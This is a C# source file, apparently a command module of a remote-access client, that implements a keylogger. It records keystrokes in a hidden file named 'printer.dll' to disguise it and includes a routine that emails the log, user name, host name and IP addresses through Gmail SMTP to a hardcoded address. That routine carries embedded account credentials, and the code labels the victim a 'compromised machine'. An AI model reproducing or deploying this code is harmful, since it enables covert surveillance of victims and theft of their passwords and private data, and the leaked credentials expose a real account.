using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Mail;

namespace Client.Commands
{
    public class keyLogger : Command
    {
        public keyLogger(string name) : base(name) { }

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long numberOfKeyStroks = 0;
        public override string execute(string[] args)
        {

            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(filePath))
                Directory.CreateDirectory(filePath);


            string path = (filePath + @"\printer.dll");
            if (!System.IO.File.Exists(path))
            {
                using (StreamWriter sr = System.IO.File.CreateText(path))
                {

                }

            }
            System.IO.File.SetAttributes(path, System.IO.File.GetAttributes(path) | FileAttributes.Hidden);


            while (true)
            {
                Thread.Sleep(5);

                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                       // Console.Write((char)i + ",");
                        using (StreamWriter sr = System.IO.File.AppendText(path))
                        {
                            sr.Write((char)i);
                        }

                        numberOfKeyStroks++;
                        if (numberOfKeyStroks % 100 == 0)
                        {
                           // SendEmails();
                        }
                    }
                }



            }


        }

        static void SendEmails()
        {
            string foldername = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string FilePath = foldername + @"\printer.dll";
            string logssContent = System.IO.File.ReadAllText(FilePath);
            string EmailBody = "";

            DateTime dateTime = DateTime.Now;
            string subject = "Message From the Compermised Machine";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var adder in host.AddressList)
            {
                EmailBody += "Address: " + adder;
            }
            EmailBody += "\n User: " + Environment.UserDomainName + " // " + Environment.UserName;
            EmailBody += "\n Host: " + host;
            EmailBody += "\n Time: " + dateTime.ToString();
            EmailBody += logssContent;

            try
            {

                SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
                MailMessage mailMessage = new MailMessage();

                mailMessage.From = new MailAddress("sherlock7767@gmail.com");
                mailMessage.To.Add("sherlock7767@gmail.com");
                mailMessage.Subject = subject;
                smtp.UseDefaultCredentials = false;
                smtp.EnableSsl = true;
                smtp.Credentials = new System.Net.NetworkCredential("sherlock7767@gmail.com", "qhrrskuhjqaodvvh");
                mailMessage.Body = EmailBody;
                smtp.Send(mailMessage);
            }
            catch (Exception ex)
            { Console.WriteLine(ex.ToString()); }


        }

    }
}
